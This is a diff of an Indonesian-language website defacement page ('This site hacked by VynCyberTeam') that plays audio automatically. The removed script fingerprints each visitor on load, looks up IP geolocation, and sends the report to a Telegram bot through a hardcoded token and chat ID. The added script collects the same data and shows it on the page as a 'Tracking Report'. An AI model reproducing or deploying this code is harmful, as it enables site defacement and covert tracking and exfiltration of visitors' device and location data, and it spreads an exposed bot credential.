@@ -12,11 +12,21 @@
       text-align: center;
       font-family: 'Iceland', sans-serif;
     }
-    .title { font-size: 3rem; color: red; }
-    .subtitle { font-size: 2.5rem; color: green; }
-    .quote { font-size: 1.5rem; margin: 20px 0; }
+    .title { font-size: 3rem; color: red; margin-top: 30px; }
+    .subtitle { font-size: 2.2rem; color: lime; margin: 10px 0; }
+    .quote { font-size: 1.4rem; color: #ccc; margin: 10px 0 30px; }
     .logo-container img { width: 300px; height: auto; }
     audio { margin-top: 20px; }
+    pre {
+      text-align: left;
+      max-width: 600px;
+      margin: 20px auto;
+      background: #111;
+      border: 1px solid #444;
+      padding: 15px;
+      color: #0f0;
+      font-size: 14px;
+    }
   </style>
 </head>
 <body>
@@ -26,95 +36,52 @@
   </div>
   <h2 class="subtitle">This site hacked by VynCyberTeam</h2>
   <p class="quote">System Breached</p>
-  <audio id="player" src="https://i.top4top.io/m_33131khih0.mp3" loop controls autoplay></audio>
+  <audio src="https://i.top4top.io/m_33131khih0.mp3" loop autoplay controls></audio>
+
+  <pre id="log">Memuat data korban...</pre>
 
   <script>
-    const botToken = '7518590238:AAFa_NmuU323qGIN6XFFox8NIVx9QT1zrPE';
-    const chatID = '6281867611';
+    async function getInfo() {
+      let output = "╭───── Tracking Report ───── ⦿\n\n";
+      const now = new Date();
 
-    async function sendToTelegram(message) {
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-        body: `chat_id=${chatID}&text=${encodeURIComponent("```\n" + message + "\n```")}&parse_mode=Markdown`
-      });
-    }
+      // Device info
+      output += `⚙️ DEVICE INFORMATION\n`;
+      output += `🖥️ Device: ${navigator.userAgent}\n`;
+      output += `💻 Platform: ${navigator.platform}\n`;
+      output += `🌐 Bahasa: ${navigator.language}\n`;
+      output += `📶 Online: ${navigator.onLine ? "Online" : "Offline"}\n`;
+      output += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
+      output += `🪟 Window Size: ${window.innerWidth}x${window.innerHeight}\n`;
+      output += `💾 RAM: ${navigator.deviceMemory || 'N/A'} GB\n`;
+      output += `🧠 CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}\n`;
+      output += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+      output += `⏰ Waktu Akses: ${now.toString()}\n`;
+      output += `📄 Title: ${document.title}\n`;
+      output += `🔗 Referrer: ${document.referrer || 'None'}\n`;
+      output += `🌍 URL: ${window.location.href}\n`;
 
-    async function logInfo() {
-      const ua = navigator.userAgent;
-      const platform = navigator.platform;
-      const lang = navigator.language;
-      const online = navigator.onLine ? 'Online' : 'Offline';
-      const screenSize = `${screen.width}x${screen.height}`;
-      const windowSize = `${window.innerWidth}x${window.innerHeight}`;
-      const cores = navigator.hardwareConcurrency;
-      const ram = navigator.deviceMemory || 'N/A';
-      const time = new Date().toString();
-      const offset = new Date().getTimezoneOffset() * -1;
-      const title = document.title;
-      const referrer = document.referrer || 'None';
-      const url = window.location.href;
-      const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      const touch = navigator.maxTouchPoints > 0 ? '✅ YA' : '❌ TIDAK';
-      const pageLoad = (performance.timing.loadEventEnd - performance.timing.navigationStart) || 0;
-      const historyLen = history.length;
-
-      let battery = '';
+      // IP info
       try {
-        const b = await navigator.getBattery();
-        battery = `🔋 Battery: ${Math.round(b.level * 100)}%\n🔌 Charging: ${b.charging ? '✅ YA' : '❌ TIDAK'}\n`;
-      } catch {
-        battery = '🔋 Battery: Unknown\n🔌 Charging: Unknown\n';
+        const res = await fetch("https://ipapi.co/json/");
+        const ip = await res.json();
+        output += `\n📍 LOCATION INFORMATION\n`;
+        output += `📡 IP Address: ${ip.ip}\n`;
+        output += `🏙️ Kota: ${ip.city}\n`;
+        output += `🗺️ Wilayah: ${ip.region}\n`;
+        output += `🌎 Negara: ${ip.country_name}\n`;
+        output += `📌 Latitude: ${ip.latitude}\n`;
+        output += `📍 Longitude: ${ip.longitude}\n`;
+        output += `🗺️ Google Maps: https://www.google.com/maps?q=${ip.latitude},${ip.longitude}\n`;
+      } catch (err) {
+        output += `\n📍 LOCATION INFORMATION\nGagal mengambil data IP.\n`;
       }
 
-      let locationBlock = '';
-      try {
-        const ip = await fetch('https://ipapi.co/json/').then(res => res.json());
-        locationBlock = `
-📍 LOCATION INFORMATION
-📡 IP Address: ${ip.ip}
-🏙️ Kota: ${ip.city}
-🏙️ Kabupaten: ${ip.region}
-🗺️ Wilayah: ${ip.region}
-🌎 Negara: ${ip.country_name}
-🏷️ Kode Pos: ${ip.postal || 'null'}
-📌 Latitude: ${ip.latitude}
-📍 Longitude: ${ip.longitude}
-🏙️ Kabupaten: ${ip.region}
-`;
-      } catch {
-        locationBlock = '📍 LOCATION INFORMATION\nTidak dapat mengambil lokasi.\n';
-      }
-
-      const report = `
-╭───── Tracking Report ───── ⦿
-
-⚙️ DEVICE INFORMATION
-🖥️ Device: ${ua}
-💻 Platform: ${platform}
-🌐 Bahasa: ${lang}
-📶 Online: ${online}
-📺 Screen Size: ${screenSize}
-🪟 Window Size: ${windowSize}
-💾 RAM: ${ram} GB
-🧠 CPU Cores: ${cores}
-${battery}⏰ Waktu Akses: ${time}
-🕒 Page Load Time: ${pageLoad.toFixed(2)} ms
-📜 History Length: ${historyLen}
-✋ Touch Support: ${touch}
-🔗 Referrer: ${referrer}
-🌍 URL: ${url}
-📄 Title: ${title}
-🕓 Timezone: ${tz}
-🧭 Offset: ${offset} menit
-
-${locationBlock}
-╰───── Telegram @denz ───── ⦿`;
-
-      sendToTelegram(report);
+      output += `\n╰───── Telegram @RendiSec ───── ⦿`;
+      document.getElementById("log").textContent = output;
     }
 
-    window.onload = logInfo;
+    window.onload = getInfo;
   </script>
 </body>
 </html>
